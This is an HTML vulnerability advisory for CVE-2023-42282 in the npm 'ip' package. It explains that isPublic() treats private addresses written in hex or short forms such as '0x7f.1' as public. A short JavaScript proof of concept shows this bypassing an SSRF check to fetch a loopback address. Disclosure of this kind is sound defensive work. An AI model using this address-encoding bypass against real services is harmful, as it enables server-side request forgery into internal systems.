
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Missing IP Address Control in isPublic() Function Leads to SSRF Bypass PoC</title>
    <style>
        /* Arka plan rengi */
        code {
            background-color: #f4f4f4;
            padding: 10px;
            display: block;
        }
    </style>
</head>
<body>
<h1>Missing IP Address Control in isPublic() Function Leads to SSRF Bypass PoC</h1>
<pre>
<b><Software: https://www.npmjs.com/package/ip</b>
<b>Version: <= 1.1.8(Latest)</b>
<b>Fixed Version: None </b>
<b>CVE ID: CVE-2023-42282</b>

<b>Vulnerabilty: Missing IP Address Control in isPublic() Function Leads to SSRF Bypass</b>
<h3>Description of the product:</h3>
IP address utilities for node.js
Get your ip address, compare ip addresses, validate ip addresses, etc.
<h3>Description of the vulnerability:</h3>
We have discovered some missing control in your isPublic() function for identifying Public and Private IP address. 
As you know, you can specify IP addresses with different formats such as 0x7f1, 127.1, 127.0.0.1. We realized that isPublic() function returns true some of the private IP addresses. 
Because of this vulnerability, attackers can bypass some SSRF mitigations.
</pre>
<h1>PoC</h1>
 <code>
        <br>var ip = require('ip');</br>
        <br>console.log(ip.isPublic("0x7f.1")); // true</br>
        <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
        <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
        <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
        <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
        <br>if (ip.isPublic(my_ip)) {</br>
            <br>fetch("http://" + my_ip).then((response) => {</br>
                <br>console.log(response);</br>
            <br>});</br>
        <br>} else {</br>
            <br>console.log("IP is not public");</br>
        <br>}</br>
 </code>
</body>
</html>
